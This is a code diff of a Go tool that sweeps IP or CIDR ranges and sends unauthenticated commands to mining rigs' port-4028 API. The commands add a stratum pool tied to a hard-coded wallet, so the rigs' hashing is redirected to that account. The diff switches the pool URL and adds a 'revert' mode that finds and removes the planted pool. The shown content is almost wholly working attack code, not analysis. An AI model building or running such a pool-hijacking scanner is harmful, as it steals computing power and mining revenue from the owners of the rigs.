@@ -16,29 +16,62 @@ import (
 
 var (
 	total   = 0
-	stratum = "stratum+tcp://btc.global.luxor.tech:700"
-	btcaddr = "BTC.lmaowtf.satoshi"
+	stratum = "stratum+tcp://sha256.unmineable.com:3333"
+	btcaddr = "BTC:lmaowtf.satoshi"
 	payload = `{"command": "addpool", "parameter": "` + stratum + `,` + btcaddr + `,"}`
 )
 
 // example payload: { "command": "addpool", "parameter": "stratum+tcp://btc.global.luxor.tech:700,account.miner.worker," }
 
-// func removePool(ipaddr string, priority string) {
-// 	conn, err := net.DialTimeout("tcp", ipaddr+":4028", 5*time.Second)
-// 	if err != nil {
-// 		return
-// 	}
-// 	defer conn.Close()
+func removePool(ipaddr string, priority string) {
+	conn, err := net.DialTimeout("tcp", ipaddr+":4028", 5*time.Second)
+	if err != nil {
+		return
+ 	}
+	defer conn.Close()
 
-// 	conn.Write([]byte(`{"command":"removepool", "parameter": "` + priority + `"}` + "\n"))
+        conn.Write([]byte(`{"command":"removepool", "parameter": "` + priority + `"}` + "\n"))
+}
 
-// 	check := checkPool(ipaddr, stratum)
-// 	if !check {
-// 		fmt.Printf("[REMOVED] %s:4028 pool priority %s removed\n", ipaddr, priority)
-// 	} else {
-// 		fmt.Printf("[FAILED] %s:4028 pool priority %s not removed\n", ipaddr, priority)
-// 	}
-// }
+func revertPool(ipaddr string, stratum string, rigtype string) {
+	conn, err := net.DialTimeout("tcp", ipaddr+":4028", 5*time.Second)
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	conn.Write([]byte(`{"command":"pools"}` + "\n"))
+
+	resp, err := io.ReadAll(conn)
+	if err != nil {
+		return
+	}
+
+	type LuxorPools struct {
+		POOLS []struct {
+			Priority int    `json:"Priority"`
+			URL      string `json:"URL"`
+		} `json:"POOLS"`
+	}
+
+	var reply LuxorPools
+	if err := json.Unmarshal(resp, &reply); err != nil {
+		return
+	}
+
+	for _, pool := range reply.POOLS {
+		// am pretty sure our pool priority is always 0
+		// just adding to be safe
+		if pool.URL == stratum {
+			total++
+			priority := fmt.Sprintf("%d", pool.Priority)
+			removePool(ipaddr, priority)
+			fmt.Printf("[SUCCESS] %s:4028 (%s) Reverted back to default pool\n", ipaddr, rigtype)
+			return
+		}
+	}
+        fmt.Printf("[INFO] %s:4028 (%s) Pool %s not found, nothing to revert\n", ipaddr, rigtype, stratum)
+}
 
 func checkPool(ipaddr string, stratum string, minerType string) bool {
 	// check if pool already exists
@@ -166,15 +199,27 @@ func incIP(ip net.IP) {
 func main() {
 
 	if len(os.Args) != 3 {
-		fmt.Printf("Usage: go run %s <IP | CIDR> <change | revert>", os.Args[0])
+		fmt.Printf("Usage: go run %s <IP | CIDR> <change | revert>\n", os.Args[0])
 		return
 	}
 
 	ipnet := os.Args[1]
+	mode := os.Args[2]
+
+	if mode != "change" && mode != "revert" {
+	    fmt.Println("Mode (args) must be \033[1;36mchange\033[0m or \033[1;36mrevert\033[0m")
+	    return
+	}
+
 
 	if _, ips, err := net.ParseCIDR(ipnet); err == nil {
 		for ip := ips.IP.Mask(ips.Mask); ips.Contains(ip); incIP(ip) {
-			changePoolAddr(ip.String())
+			if mode == "change" {
+			     changePoolAddr(ip.String())
+			} else {
+			     rigType := getRigType(ip.String())
+			     revertPool(ip.String(), stratum, rigType)
+			}
 			time.Sleep(100 * time.Millisecond)
 		}
 		fmt.Println("Total pools changed:", total)
@@ -187,6 +232,11 @@ func main() {
 		return
 	}
 
-	changePoolAddr(ipv4.String())
+	if mode == "change" {
+	    changePoolAddr(ipv4.String())
+	} else {
+	    rigType := getRigType(ipv4.String())
+	    revertPool(ipv4.String(), stratum, rigType)
+	}
 	fmt.Println("Total pools changed:", total)
 }
